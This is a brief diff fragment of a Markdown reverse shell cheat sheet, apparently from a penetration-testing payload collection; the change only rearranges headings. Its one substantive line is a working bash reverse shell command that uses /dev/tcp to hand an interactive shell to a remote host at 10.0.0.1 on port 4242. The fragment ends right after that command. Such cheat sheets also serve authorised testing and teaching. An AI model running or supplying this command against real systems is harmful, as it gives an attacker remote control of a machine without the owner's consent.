@@ -1,6 +1,7 @@
-## Reverse Shell | Cheat Sheet
+# Reverse Shell | Cheat Sheet
 
-### Transmission Control Protocol | Bourne-Again Shell
+## Bourne-Again Shell
+### Transmission Control Protocol
 #### Remote Host
 ```
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
